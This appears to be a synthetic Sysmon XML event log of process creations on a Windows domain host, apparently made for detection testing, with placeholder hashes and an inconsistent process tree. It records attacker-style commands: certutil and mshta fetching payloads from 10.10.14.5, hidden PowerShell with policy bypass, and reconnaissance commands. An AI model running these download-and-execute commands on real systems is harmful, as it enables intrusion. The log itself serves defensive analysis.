<?xml version="1.0" encoding="UTF-8"?>
<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:00.0000000Z" />
      <EventRecordID>5000</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:00.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0000-000000000c00}</Data>
      <Data Name="ProcessId">6000</Data>
      <Data Name="Image">C:\Windows\explorer.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">explorer.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">explorer.exe</Data>
      <Data Name="CommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000000000000000000000000000000000000000,MD5=00000000000000000000000000000000,SHA256=0000000000000000000000000000000000000000000000000000000000000000,IMPHASH=00000000000000000000000000000000</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0000-000000000c00}</Data>
      <Data Name="ParentProcessId">5000</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:07.0000000Z" />
      <EventRecordID>5001</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:07.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0001-000000000c00}</Data>
      <Data Name="ProcessId">6001</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">cmd.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">cmd.exe</Data>
      <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000000100000001000000010000000100000001,MD5=00000001000000010000000100000001,SHA256=0000000100000001000000010000000100000001000000010000000100000001,IMPHASH=00000001000000010000000100000001</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0001-000000000c00}</Data>
      <Data Name="ParentProcessId">5001</Data>
      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="ParentCommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:14.0000000Z" />
      <EventRecordID>5002</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:14.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0002-000000000c00}</Data>
      <Data Name="ProcessId">6002</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">powershell.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000000200000002000000020000000200000002,MD5=00000002000000020000000200000002,SHA256=0000000200000002000000020000000200000002000000020000000200000002,IMPHASH=00000002000000020000000200000002</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0002-000000000c00}</Data>
      <Data Name="ParentProcessId">5002</Data>
      <Data Name="ParentImage">C:\Windows\System32\certutil.exe</Data>
      <Data Name="ParentCommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:21.0000000Z" />
      <EventRecordID>5003</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:21.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0003-000000000c00}</Data>
      <Data Name="ProcessId">6003</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">certutil.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000000300000003000000030000000300000003,MD5=00000003000000030000000300000003,SHA256=0000000300000003000000030000000300000003000000030000000300000003,IMPHASH=00000003000000030000000300000003</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0003-000000000c00}</Data>
      <Data Name="ParentProcessId">5003</Data>
      <Data Name="ParentImage">C:\Windows\System32\whoami.exe</Data>
      <Data Name="ParentCommandLine">whoami /groups</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:28.0000000Z" />
      <EventRecordID>5004</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:28.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0004-000000000c00}</Data>
      <Data Name="ProcessId">6004</Data>
      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">whoami.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">whoami.exe</Data>
      <Data Name="CommandLine">whoami /groups</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000000400000004000000040000000400000004,MD5=00000004000000040000000400000004,SHA256=0000000400000004000000040000000400000004000000040000000400000004,IMPHASH=00000004000000040000000400000004</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0004-000000000c00}</Data>
      <Data Name="ParentProcessId">5004</Data>
      <Data Name="ParentImage">C:\Windows\System32\notepad.exe</Data>
      <Data Name="ParentCommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:35.0000000Z" />
      <EventRecordID>5005</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:35.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0005-000000000c00}</Data>
      <Data Name="ProcessId">6005</Data>
      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">notepad.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">notepad.exe</Data>
      <Data Name="CommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000000500000005000000050000000500000005,MD5=00000005000000050000000500000005,SHA256=0000000500000005000000050000000500000005000000050000000500000005,IMPHASH=00000005000000050000000500000005</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0005-000000000c00}</Data>
      <Data Name="ParentProcessId">5005</Data>
      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:42.0000000Z" />
      <EventRecordID>5006</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:42.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0006-000000000c00}</Data>
      <Data Name="ProcessId">6006</Data>
      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">svchost.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">svchost.exe</Data>
      <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000000600000006000000060000000600000006,MD5=00000006000000060000000600000006,SHA256=0000000600000006000000060000000600000006000000060000000600000006,IMPHASH=00000006000000060000000600000006</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0006-000000000c00}</Data>
      <Data Name="ParentProcessId">5006</Data>
      <Data Name="ParentImage">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="ParentCommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:49.0000000Z" />
      <EventRecordID>5007</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:49.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0007-000000000c00}</Data>
      <Data Name="ProcessId">6007</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">rundll32.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000000700000007000000070000000700000007,MD5=00000007000000070000000700000007,SHA256=0000000700000007000000070000000700000007000000070000000700000007,IMPHASH=00000007000000070000000700000007</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0007-000000000c00}</Data>
      <Data Name="ParentProcessId">5007</Data>
      <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
      <Data Name="ParentCommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:00:56.0000000Z" />
      <EventRecordID>5008</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:00:56.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0008-000000000c00}</Data>
      <Data Name="ProcessId">6008</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">mshta.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">mshta.exe</Data>
      <Data Name="CommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000000800000008000000080000000800000008,MD5=00000008000000080000000800000008,SHA256=0000000800000008000000080000000800000008000000080000000800000008,IMPHASH=00000008000000080000000800000008</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0008-000000000c00}</Data>
      <Data Name="ParentProcessId">5008</Data>
      <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
      <Data Name="ParentCommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:03.0000000Z" />
      <EventRecordID>5009</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:03.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0009-000000000c00}</Data>
      <Data Name="ProcessId">6009</Data>
      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">wscript.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">wscript.exe</Data>
      <Data Name="CommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000000900000009000000090000000900000009,MD5=00000009000000090000000900000009,SHA256=0000000900000009000000090000000900000009000000090000000900000009,IMPHASH=00000009000000090000000900000009</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0009-000000000c00}</Data>
      <Data Name="ParentProcessId">5009</Data>
      <Data Name="ParentImage">C:\Windows\System32\net.exe</Data>
      <Data Name="ParentCommandLine">net user administrator /domain</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:10.0000000Z" />
      <EventRecordID>5010</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:10.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0010-000000000c00}</Data>
      <Data Name="ProcessId">6010</Data>
      <Data Name="Image">C:\Windows\System32\net.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">net.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">net.exe</Data>
      <Data Name="CommandLine">net user administrator /domain</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000000A0000000A0000000A0000000A0000000A,MD5=0000000A0000000A0000000A0000000A,SHA256=0000000A0000000A0000000A0000000A0000000A0000000A0000000A0000000A,IMPHASH=0000000A0000000A0000000A0000000A</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0010-000000000c00}</Data>
      <Data Name="ParentProcessId">5010</Data>
      <Data Name="ParentImage">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="ParentCommandLine">ipconfig /all</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:17.0000000Z" />
      <EventRecordID>5011</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:17.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0011-000000000c00}</Data>
      <Data Name="ProcessId">6011</Data>
      <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">ipconfig.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">ipconfig.exe</Data>
      <Data Name="CommandLine">ipconfig /all</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000000B0000000B0000000B0000000B0000000B,MD5=0000000B0000000B0000000B0000000B,SHA256=0000000B0000000B0000000B0000000B0000000B0000000B0000000B0000000B,IMPHASH=0000000B0000000B0000000B0000000B</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0011-000000000c00}</Data>
      <Data Name="ParentProcessId">5011</Data>
      <Data Name="ParentImage">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="ParentCommandLine">tasklist /v</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:24.0000000Z" />
      <EventRecordID>5012</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:24.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0012-000000000c00}</Data>
      <Data Name="ProcessId">6012</Data>
      <Data Name="Image">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">tasklist.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">tasklist.exe</Data>
      <Data Name="CommandLine">tasklist /v</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000000C0000000C0000000C0000000C0000000C,MD5=0000000C0000000C0000000C0000000C,SHA256=0000000C0000000C0000000C0000000C0000000C0000000C0000000C0000000C,IMPHASH=0000000C0000000C0000000C0000000C</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0012-000000000c00}</Data>
      <Data Name="ParentProcessId">5012</Data>
      <Data Name="ParentImage">C:\Windows\System32\reg.exe</Data>
      <Data Name="ParentCommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:01:31.0000000Z" />
      <EventRecordID>5013</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:01:31.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0013-000000000c00}</Data>
